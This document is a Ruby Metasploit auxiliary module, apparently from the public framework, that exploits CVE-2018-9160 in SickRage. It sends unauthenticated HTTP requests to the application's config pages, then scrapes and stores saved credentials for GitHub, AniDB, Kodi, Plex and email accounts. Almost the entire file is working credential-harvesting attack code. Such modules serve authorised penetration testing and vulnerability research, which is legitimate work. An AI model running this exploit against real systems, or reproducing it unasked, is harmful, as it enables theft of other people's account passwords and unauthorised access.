##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP SickRage Password Leak',
      'Description'    => %q{
        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP
        responses unless the user has set login information for SickRage.

        By default, SickRage does not require login information for the installation.
      },
      'Author'         =>
      [
        'Sven Fassbender', # EDB POC
        'Shelby Pace'     # Metasploit Module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2018-9160'],
          ['EDB', '44545']
        ],
      'DisclosureDate' => 'Mar 8 2018'
    ))

    register_options(
    [
      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),
      Opt::RPORT(8081)
    ])
  end

  def get_config(path)
    uri = normalize_uri(target_uri.path, path)
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => uri
    )

    # Improve this later: Add a loginscanner.
    if res && res.headers['Location'] =~ /^\/login\//
      raise RuntimeError, 'SickRage is protected with authentication'
    end

    unless res && res.code == 200
      print_error("Unable to reach #{uri}")
      return
    end

    res.get_html_document
  end

  def is_valid?(user, pass)
    !(user.empty? || ['None', 'hidden_value'].include?(pass))
  end

  def save_creds(app, user, pass)
    print_good("#{app} username: #{user}")
    print_good("#{app} password: #{pass}")
    store_valid_credential(user: user, private: pass)
  end

  def get_creds(path, config)
    return if config.at("input[@id=\"#{path}_username\"]").nil?

    username = config.at("input[@id=\"#{path}_username\"]").attribute('value').to_s
    password = config.at("input[@id=\"#{path}_password\"]").attribute('value').to_s

    if is_valid?(username, password)
      save_creds(path, username, password)
    end
  end

  def get_notification_creds(config)
    return if config.at('input[@id="email_host"]').nil?

    hostname = config.at('input[@id="email_host"]').attribute('value').to_s
    email_user = config.at('input[@id="email_user"]').attribute('value').to_s
    email_pass = config.at('input[@id="email_password"]').attribute('value').to_s

    if is_valid?(email_user, email_pass)
      save_creds("Email", "#{email_user}@#{hostname}", email_pass)
    end
  end

  def run
    begin
      paths = ['/config/general/', '/config/anime/', '/config/notifications/']
      paths.each do |path|
        config = get_config(path)
        next if config.nil?

        if path.split('/').last.eql?('notifications')
          get_notification_creds(config)
        end

        ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|
          get_creds(path, config)
        end
      end
    rescue RuntimeError => e
      print_error(e.message)
    end
  end
end
